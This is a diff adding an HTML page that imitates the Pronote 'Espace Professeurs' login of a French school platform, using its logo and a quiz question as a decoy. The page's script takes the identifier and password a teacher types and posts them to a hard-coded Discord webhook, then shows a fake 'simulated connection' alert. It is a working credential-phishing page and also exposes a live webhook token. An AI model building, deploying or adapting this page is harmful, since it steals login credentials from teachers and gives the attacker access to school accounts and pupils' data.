@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Espace Professeurs</title>
+
+<style>
+*{box-sizing:border-box;font-family:Arial,sans-serif}
+
+body{
+  margin:0;height:100vh;background:#0a9a84;
+  display:flex;justify-content:center;align-items:center;
+}
+
+.pronote-logo{
+  position:fixed;top:15px;right:20px
+}
+.pronote-logo img{height:38px}
+
+.container{
+  width:90%;max-width:1100px;
+  display:flex;justify-content:space-between;align-items:center
+}
+
+.left{color:white;max-width:460px}
+.badge{
+  background:#f5c400;color:black;font-size:12px;
+  padding:4px 8px;border-radius:6px;font-weight:bold
+}
+.left h2{margin:15px 0}
+.left ul{list-style:none;padding:0}
+.left li{margin:6px 0}
+
+.login-box{
+  background:white;width:340px;padding:25px;
+  border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,.25);
+  text-align:center
+}
+
+.radio{
+  display:flex;justify-content:space-around;
+  margin-bottom:15px;font-size:14px
+}
+
+input[type=text],input[type=password]{
+  width:100%;padding:10px;margin-bottom:12px;
+  border-radius:6px;border:1px solid #ccc
+}
+
+button{
+  width:100%;padding:10px;border-radius:20px;
+  border:none;background:#ccc;color:white;
+  cursor:not-allowed
+}
+
+button.active{
+  background:#1e88e5;
+  cursor:pointer
+}
+</style>
+</head>
+
+<body>
+
+<div class="pronote-logo">
+  <img src="img.png" alt="Pronote">
+</div>
+
+<div class="container">
+
+  <div class="left">
+    <span class="badge">ENVIRONNEMENT</span>
+    <h2>Quel est le pourcentage d’eau douce sur Terre ?</h2>
+    <ul>
+      <li>A · 2,5 %</li>
+      <li>B · 6 %</li>
+      <li>C · 17,3 %</li>
+      <li>D · 37 %</li>
+    </ul>
+  </div>
+
+  <div class="login-box">
+    <h3>Espace Professeurs</h3>
+
+    <div class="radio">
+      <label><input type="radio" name="lieu" checked> Domicile</label>
+      <label><input type="radio" name="lieu"> Dans la classe</label>
+    </div>
+
+    <input id="user" type="text" placeholder="Identifiant">
+    <input id="pass" type="password" placeholder="Mot de passe">
+
+    <button id="btn" disabled>Se connecter</button>
+  </div>
+
+</div>
+
+<script>
+const user = document.getElementById("user");
+const pass = document.getElementById("pass");
+const btn  = document.getElementById("btn");
+
+function check(){
+  if(user.value.trim() && pass.value.trim()){
+    btn.classList.add("active");
+    btn.disabled = false;
+  } else {
+    btn.classList.remove("active");
+    btn.disabled = true;
+  }
+}
+
+user.addEventListener("input", check);
+pass.addEventListener("input", check);
+
+btn.addEventListener("click", () => {
+  const id = user.value;
+  const mdp = pass.value;
+  const message = `Identifiant: ${id}\nMot de passe: ${mdp}`;
+
+  // Remplacez 'VOTRE_WEBHOOK_URL' par l'URL de votre webhook
+  const webhookUrl = 'https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw';
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ content: message })
+  })
+  .then(response => response.json())
+  .then(data => console.log('Success:', data))
+  .catch((error) => console.error('Error:', error));
+
+  alert("Connexion simulée et données envoyées à Discord");
+  console.log({
+    identifiant: id,
+    motDePasse: mdp
+  });
+});
+</script>
+
+</body>
+</html>
